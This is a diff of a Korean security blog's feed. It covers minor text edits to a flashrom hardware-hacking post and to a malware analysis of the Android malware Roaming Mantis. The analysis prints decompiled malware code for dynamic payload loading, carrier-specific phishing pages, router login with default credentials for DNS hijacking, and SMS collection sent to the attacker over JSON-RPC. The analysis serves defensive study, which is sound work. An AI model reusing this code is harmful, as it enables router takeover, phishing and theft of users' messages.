+      &lt;p&gt;일반적으로 검은색 선은 (-), 빨간색 선은 (+)이다. 따라서 검은색 리드선을 GND에 연결한다. &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:3&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;symbol, 의미있는 데이터 묶음 &lt;a href=&quot;#fnref:3&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:4&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://github.com/flashrom/flashrom&quot;&gt;flashrom 빌드 방법&lt;/a&gt;&lt;/p&gt;
+
+      &lt;p&gt;칩에 접근하는 모든 작업에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; 또는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--programmer&lt;/code&gt; 옵션을 사용해야 한다.&lt;/p&gt;
+
+      &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p &amp;lt;programmername&amp;gt;[:&amp;lt;parameters&amp;gt;]&lt;/code&gt;&lt;/p&gt;
+
+      &lt;ul&gt;
+        &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_spi&lt;/code&gt; (for SPI flash ROMs accessible via /dev/spidevX.Y on Linux)&lt;/li&gt;
+      &lt;/ul&gt;
+
+      &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--read &amp;lt;file&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+      &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--write &amp;lt;file&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+      &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-c&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-chip &amp;lt;chipname&amp;gt;&lt;/code&gt; &lt;a href=&quot;#fnref:4&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;</content><author><name>이주협, 이주영</name></author><category term="R&amp;D" /><summary type="html">하드웨어 해킹: 뉴비 입문기</summary></entry><entry xml:lang="ko"><title type="html">Android Malware : 사마귀 해부학</title><link href="http://ufo.stealien.com/id/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko" rel="alternate" type="text/html" title="Android Malware : 사마귀 해부학" /><published>2023-11-15T10:00:00+09:00</published><updated>2023-11-15T10:00:00+09:00</updated><id>http://ufo.stealien.com/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko</id><content type="html" xml:base="http://ufo.stealien.com/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko">&lt;h1 id=&quot;android-malware--사마귀-해부학&quot;&gt;Android Malware : 사마귀 해부학&lt;/h1&gt;
 
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
@@ -37,7 +752,7 @@
 
 &lt;p&gt;Android Malware인 &lt;strong&gt;Roaming Mantis&lt;/strong&gt;였습니다. 2018년에 처음으로 발견된 아주 오래 된 Malware입니다. 가장 많이 알려진 기능은 &lt;strong&gt;취약한 공용 라우터를 장악하여 DNS 서버를 변조&lt;/strong&gt;(&lt;strong&gt;DNS Hijacking&lt;/strong&gt;)하는 것으로, 그렇게 되면 사용자가 어떤 사이트로 가더라도 공격자의 서버로 이동할 수 밖에 없습니다.&lt;/p&gt;
 
-&lt;p&gt;가령, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;google.com&lt;/code&gt;으로 가더라도 공격자가 똑같이 만든 Google 페이지에서 사용자를 로그인을 수행하게 될 것입니다. 그리고 이것은 같은 Wifi를 쓰는 모든 사용자에게 영향을 미칩니다.&lt;/p&gt;
+&lt;p&gt;가령, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;google.com&lt;/code&gt;으로 가더라도 공격자가 똑같이 만든 Google 페이지에서 로그인을 수행하게 될 것입니다. 그리고 이것은 같은 Wifi를 쓰는 모든 사용자에게 영향을 미칩니다.&lt;/p&gt;
 
 &lt;p&gt;이 앱은 다국가(일본, 오스트리아, 대한민국 등) 대상이지만, 2023년 관련 포스팅에 따르면 한국에 위치한 유명 네트워크 장비 공급 업체들의 라우터만을 표적으로 삼고 있다고 합니다.&lt;/p&gt;
 
@@ -155,7 +870,7 @@
 
 &lt;p&gt;&lt;strong&gt;④ Load Class&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ImApplication&lt;/code&gt; 에서 가장 마지막에 실행되는 a method입니다.&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ImApplication&lt;/code&gt; 에서 가장 마지막에 실행되는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt; method입니다.&lt;/p&gt;
 
 &lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
 				&lt;span class=&quot;c1&quot;&gt;// obj = DexClassLoader(path = /data/user/0/rbj.xnpm.gjga.ucms/files/b)&lt;/span&gt;
@@ -183,7 +898,7 @@
 
 &lt;p&gt;모든 동작을 분석하기엔 양이 너무 많으므로, 아래의 동작들에 대해서만 분석해보겠습니다.&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;이 중 Roaming Mantis의 핵심 동작(DNS 조작)은 ⑤ 공유기 장악 부분을 보시면 되겠습니다.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;이 중 Roaming Mantis의 핵심 동작은 ⑤ 공유기 장악(DNS Hijacking) 부분을 보시면 되겠습니다.&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;① A사 백신 삭제&lt;/strong&gt;&lt;/p&gt;
 
@@ -263,7 +978,7 @@
 &lt;p&gt;전달 받은 값은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1:port/submit&lt;/code&gt; 으로 전달, Response 값을 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setMyInfo&lt;/code&gt; method로 JSON-RPC 통신하게 됩니다. 즉 공격자에게 전달됩니다.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Json-RPC는 원격 프로시저 호출을 위한 프로토콜입니다. 서버와 경량의 데이터 교환을 수행하는데, 이 때 JOSN 형식을 사용합니다.&lt;/li&gt;
+  &lt;li&gt;JSON-RPC는 원격 프로시저 호출을 위한 프로토콜입니다. 서버와 경량의 데이터 교환을 수행하는데, 이 때 JSON 형식을 사용합니다.&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;v8_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -287,7 +1002,9 @@
 
 &lt;p&gt;④ &lt;strong&gt;Phishing 창 생성 #2&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;또 다른 Phishing 창의 예시를 살펴봅시다. 이 Phishing은 앱 이름이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zc1&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zc&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scan&lt;/code&gt; 일 경우 수행됩니다. 사용자가 어떤 통신사를 사용하는 지에 따라, 그에 맞는 피싱 페이지를 생성합니다. 아래는 일본의 통신사인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;domoco&lt;/code&gt;를 사용 할 경우의 예시입니다.&lt;/p&gt;
+&lt;p&gt;또 다른 Phishing 창의 예시를 살펴봅시다. 이 Phishing은 앱 이름이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zc1&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zc&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scan&lt;/code&gt; 일 경우 수행됩니다.&lt;/p&gt;
+
+&lt;p&gt;사용자가 어떤 통신사를 사용하는 지에 따라, 그에 맞는 Phishing 페이지를 생성합니다. 아래는 일본의 통신사인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;domoco&lt;/code&gt;를 사용 할 경우의 예시입니다.&lt;/p&gt;
 
 &lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0_3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;docomo&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1. domoco 통신사일 경우&lt;/span&gt;
                     &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v0_6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://www.pinterest.com/catogreggex11/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
@@ -297,7 +1014,7 @@
                 &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;v0_6 변수를 보면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://www.pinterest.com/catogreggex11/&lt;/code&gt;의 주소로 접근하려는 것을 볼 수 있습니다. Pinterest는 유명한 이미지 공유 사이트로, 피싱 사이트가 아닙니다. 해당 URL은 경로에 적힌 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catogreggex11&lt;/code&gt; 계정의 프로필 페이지에 접근 하는 것으로, 한번 직접 접근해보도록 합시다.&lt;/p&gt;
+&lt;p&gt;v0_6를 보면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://www.pinterest.com/catogreggex11/&lt;/code&gt;의 주소로 접근하려는 것을 볼 수 있습니다. Pinterest는 유명한 이미지 공유 사이트로, 피싱 사이트가 아닙니다. 해당 URL은 경로에 적힌 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catogreggex11&lt;/code&gt; 계정의 프로필 페이지에 접근 하는 것으로, 한번 직접 접근해보도록 합시다.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/2023-11-15-Android-malware-사마귀-해부학/11.png&quot; alt=&quot;11.png&quot; /&gt;&lt;/p&gt;
 
@@ -309,12 +1026,12 @@
 
 &lt;p&gt;Roaming Mantis의 가장 핵심이 되는 공유기 장악 기능을 분석해봅시다.&lt;/p&gt;
 
-&lt;p&gt;모바일 환경에서는 대부분의 기기가 공유기(라우터)를 DHCP 서버로 두고 IP 및 DNS 주소를 할당 받는 방식을 사용하고 있습니다. 따라서 공격자 DHCP Server의 IP 주소를 수집합니다.&lt;/p&gt;
+&lt;p&gt;모바일 환경에서는 대부분의 기기가 공유기(라우터)를 DHCP 서버로 두고 IP 및 DNS 주소를 할당 받는 방식을 사용하고 있습니다. 따라서 공격자는 DHCP Server의 IP 주소를 수집합니다.&lt;/p&gt;
 
 &lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;WifiManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getApplicationContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSystemService&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wifi&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDhcpInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;serverAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;DHCP 서버의 IP 주소를 알아봤자, 사설 IP의 주소일 가능성이 매우 크기 때문에 공격자는 직접 접근하기 어려울 것입니다. 내부에서 접근을 시도해야 하므로 공격자는 사용자의 기기로 접근합니다.&lt;/p&gt;
+&lt;p&gt;하지만 DHCP 서버의 IP 주소를 알아봤자, 사설 IP의 주소일 가능성이 매우 크기 때문에 공격자는 직접 접근하기 어려울 것입니다. 내부에서 접근을 시도해야 하므로 공격자는 사용자의 기기로 접근합니다.&lt;/p&gt;
 
 &lt;p&gt;공격자는 수집한 DHCP 서버의 IP 주소에 특정 TCP Port를 추가하여 로그인 페이지를 호출합니다.&lt;/p&gt;
 
@@ -357,7 +1074,7 @@
 
 &lt;p&gt;매칭된 숫자에 따라 실행되는 method들이 달라집니다. 1번에 매칭되었으니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a.e&lt;/code&gt; method로 이동해봅시다.&lt;/p&gt;
 
-&lt;p&gt;매칭된 i사의 공유기의 Default Credential과 token 검증 방식으로 인증을 수행하기 위해 Request Header 생성, 이를 Default URL로 전달하고 있습니다. 각 공유기마다 Header의 조합과 URL 주소가 다르며, 일반적인 공유기 사용자가 관리 페이지의 Credential을 바꾸는 일은 흔치 않기 때문에 공격자는 공유기를 쉽게 관리자로 로그인 할 수 있습니다.&lt;/p&gt;
+&lt;p&gt;매칭된 i사의 공유기의 Default Credential과 token 검증 방식으로 인증을 수행하기 위해 Request Header 생성, 이를 Default URL로 전달하고 있습니다. 각 공유기마다 Header의 조합과 URL 주소가 다르며, 일반적인 공유기 사용자가 관리 페이지의 Credential을 바꾸는 일은 흔치 않기 때문에 공격자는 쉽게 관리자로 로그인 할 수 있습니다.&lt;/p&gt;
 
 &lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg14&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
         &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
@@ -461,7 +1178,7 @@
 
 &lt;p&gt;&lt;img src=&quot;/assets/2023-11-15-Android-malware-사마귀-해부학/17.png&quot; alt=&quot;17.png&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;공격자는 SMS 메시지가 수신될 때, 발신자의 주소와 timestamp내용을 HashMap으로 저장하며 수집합니다.&lt;/p&gt;
+&lt;p&gt;공격자는 SMS 메시지가 수신될 때, 발신자의 주소와 timestamp, 그리고 메시지내용을 HashMap으로 저장하며 수집합니다.&lt;/p&gt;
 
 &lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// 1. 수신된 메시지들 수집&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;v0_6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[])&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg27&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getExtras&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pdus&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
@@ -486,7 +1203,7 @@
 &lt;p&gt;JSON-RPC로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onSms&lt;/code&gt; method와 수집한 내용을 공격자 서버로 전달합니다.&lt;/p&gt;
 
 &lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// s = &quot;onSms&quot;&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// 1. Json-RPC로 onSms mthod 실행&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// 1. Json-RPC로 onSms method 실행&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;Map&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;map0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;jsonrpc&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2.0&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)});&lt;/span&gt;
 
 &lt;span class=&quot;c1&quot;&gt;// 2. 수집한 내용을 params로 전달&lt;/span&gt;
@@ -520,7 +1237,7 @@
 	&lt;span class=&quot;n&quot;&gt;s15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;已连接:&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRemoteSocketAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
 
 	&lt;span class=&quot;c1&quot;&gt;// 3-2. 연결되지 않았을 경우&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;s15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;未连接,&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;,&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wifiManager0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wifiManager0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isWifiEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;,&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;s15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;未连接,&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wifiManager0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wifiManager0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isWifiEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
 
 &lt;span class=&quot;c1&quot;&gt;// 4. 앞 긑자리 SI인 경우, addr_url/addr_encoding/addr_pattern/addr_accounts 추가&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SI&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
@@ -537,7 +1254,7 @@
 
 &lt;hr /&gt;
 
